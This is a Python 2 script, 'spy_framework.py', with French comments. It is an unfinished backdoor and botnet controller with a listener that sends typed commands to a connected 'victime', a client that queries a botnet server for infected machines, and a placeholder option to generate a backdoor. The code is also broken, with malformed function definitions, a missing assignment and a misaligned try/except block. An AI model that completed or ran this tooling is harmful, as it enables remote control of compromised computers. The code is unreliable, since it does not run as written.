import socket
import sys
import threading

#version non testable, simplement pour but de montrer l'avancer du projet
#toute les instruction pass veulent dire que c'est en developpement



def listen:
	host = socket.gethostbyname(socket.gethostname())
	port = 443 #you can modify it
	listening = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listening.bind((host, port))
	while True:
		(victime, (address, his_port)) = listening.accept()
		print address
		interact = raw_input('Ritsu_:')
		victime.send(interact)
		data = victime.recv(1024)
		print data

def connectto_b0tnet:
	host = socket.gethostbyname(socket.gethostname()) 
	port 443
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		server = raw_input('enter the server ip')
		server_port = input("enter the server's port please :3!!!")
	connection.connect((server, server_port))
	except:
		print 'ip and port not available please retry bye ;) '
	while True:
		#donc notre commande au server comme liste les machines infected
		#si par exemple notre commande que l'on envoie correspond par exemple à liste
		#le server reçoit et reconnait la commande liste et vous envoie la liste des machine infecté
		
		interaction = raw_input('Ritsu_b0tnet_>:')
		if interaction != "":
			connection.send(interaction)
			data = connection.recv(1024)
			print data
		elif interaction == "list":
			connection.send(interaction)
			data = connection.recv(1024)
			print data
		#j'ai mis deux conditio car pour l'instant je ne sais pas encore sous quelle forme on va recupérer les addresses ip va falloir que je fasse un peu de recherches
		elif interaction == "exit":
			connection.close()
print('__________ .__   __                  ')
print('\______   \|__|_/  |_   ______ __ __ ')
print('|       _/|  |\   __\ /  ___/|  |  \'')
print('|    |   \|  | |  |   \___ \ |  |  /')
print('|____|_  /|__| |__|  /____  >|____/ ')
print('        \/                 \/        ')
print('spy_framework.py v1.00 \n')

print '1) listening (backdoor)'
print '2) connect to the botnet server'
print '3) generate backdoor'

command  = input('your task?')

if command == 1:
	listen()
elif command == 2:
	connectto_b0tnet()
elif command == 3:
	pass
	
